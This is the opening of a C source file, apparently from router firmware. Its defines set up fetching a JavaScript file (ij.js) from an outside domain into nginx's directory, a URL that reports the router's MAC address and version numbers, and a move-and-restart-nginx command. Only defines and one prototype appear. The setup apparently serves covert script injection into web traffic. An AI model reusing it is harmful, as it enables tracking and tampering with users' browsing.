#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include "md5.h"
#include "log_tools.h"
#include "file_ops.h"
#include "pub_head.h"

#define JS_FILE		"/etc/nginx/ij.js"
#define JS_FILE_TMP	"/tmp/ij.js"
#define NGX_FILE	"/etc/init.d/nginx"
#define HTTP_DOMAIN 	"c.so9.cc"
#define CMD_GET_WANMAC	"uci get network.wan.macaddr|sed 's/://g'"
#define CMD_GET_HW_VER	"uci get system.system.hw_ver"
#define CMD_GET_FW_VER	"uci get system.system.fw_ver"
#define MV_RELOAD_NGX_FMT	"mv -f %s %s && %s restart"
#define PING_CMD_FMT 	"/bin/ping -c 3 -W 3 %s"
#ifdef FXK2P
#define HTTP_ADDR_FMT	"http://%s/router/c/?t=fxk2p&f=I&g=%s&v=2&dv=%s&rv=%s"
#else
#define HTTP_ADDR_FMT   "http://%s/router/c/?t=fxk2&f=I&g=%s&v=2&dv=%s&rv=%s"
#endif
int get_js(void);
